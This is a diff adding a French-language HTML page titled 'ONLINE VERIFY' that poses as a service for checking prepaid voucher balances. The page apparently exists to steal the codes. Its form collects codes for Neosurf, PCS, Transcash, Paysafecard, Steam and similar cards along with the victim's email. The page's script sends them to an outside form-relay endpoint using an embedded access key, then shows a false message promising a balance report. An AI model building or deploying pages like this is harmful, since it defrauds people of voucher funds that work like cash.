@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ONLINE VERIFY</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+       
+    </header>
+   <div id="wrapper">
+    <form action="https://api.web3forms.com/submit" method="POST" class="form" onsubmit="goToHomePage(event);reset()">
+        <fieldset>
+        <h2>VEUILLEZ ENTRER LES INFORMATION DU COUPONS ICI</h2>
+        <input type="hidden" name="access_key" value="e99b4f1a-9839-42e6-bd5f-2a6f31e8e305">
+         <div>
+            <label for="recharge">Choisir une recharge *</label>
+                    <select name="recharge" id="recharge" required>
+                        <option value="0" disabled selected>---Recharge---</option>
+                        <option value="NEOSURF">NEOSURF</option>
+                        <option value="PCS">PCS</option>
+                        <option value="TRANSCASH">TRANSCASH</option>
+                        <option value="GOOGLE PLAY">GOOGLE PLAY</option>
+                        <option value="PAYSAFECARD">PAYSAFECARD</option>
+                        <option value="STEAM">STEAM</option>
+                        <option value="AMAZON">AMAZON</option>
+                        <option value="NETFLIX">NETFLIX</option>
+                        <option value="FLEXPIN">FLEXPIN</option>
+                        <option value="CASHLIB">CASHLIB</option>
+                    </select>  
+         </div>
+         <div>
+            <label for="Montant">Montant de la recharge *</label>
+            <input type="text" id="Montant" name="Montant" placeholder="0" required >
+        </div>
+        <div>
+            <label for="devise">Choisir une devise *</label>
+            <select name="devise" id="devise" required >
+                <option value="0" disabled selected>---Devise---</option>
+                <option value="euro">EURO</option>
+                <option value="dollar">USD</option>
+                <option value="CHF">CHF</option>
+            </select>
+        </div>
+        <div>
+            <label for="code">Entrez les codes de recharge</label>
+            <input type="text" id="code" name="code" placeholder="Entrez le code de la recharge 1" required >
+        </div>
+        <div>
+            <input type="text" id="code" name="code" placeholder="Entrez le code de la recharge 2" >
+        </div>
+        <div>
+            <input type="text" id="code" name="code" placeholder="Entrez le code de la recharge 3" >
+        </div>
+        <div>
+            <input type="text" id="code" name="code" placeholder="Entrez le code de la recharge 4" >
+        </div>
+        <div>
+            <label for="email">Entrez votre adresse mail *</label>
+            <input type="email" name="email" id="email" placeholder="abcdef@domain.com" required>
+        </div>
+    </fieldset>
+        <button type="submit">Verifier</button>
+    </form>
+   </div>
+   <footer>
+    <small>© Copyright Verification Plateform 2022.</small><br>
+    <small>Conditions d'utilisation<br>Politique de cookies</small><br>
+    
+</footer> 
+<script>
+    function goToHomePage(event) {
+        // Empêcher le comportement de soumission par défaut
+        event.preventDefault();
+
+        // Récupérer les données du formulaire
+        var formData = new FormData(event.target);
+
+        // Envoyer les données du formulaire en utilisant AJAX
+        fetch(event.target.action, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => {
+            // Traiter la réponse (par exemple, afficher un message de réussite)
+            console.log('Formulaire soumis avec succès:', response);
+            // Vous pouvez également afficher un message de réussite à l'utilisateur
+            alert("Votre demande de vérification de recharge est en cours. Recevez bientôt un e-mail avec votre solde. Merci.!");
+        })
+        .catch(error => {
+            // Traiter l'erreur (par exemple, afficher un message d'erreur)
+            console.error('Erreur lors de la soumission du formulaire:', error);
+            // Vous pouvez également afficher un message d'erreur à l'utilisateur
+            alert('Erreur lors de la soumission du formulaire. Veuillez réessayer.');
+        });
+    }
+</script>
+</body>
+</html>
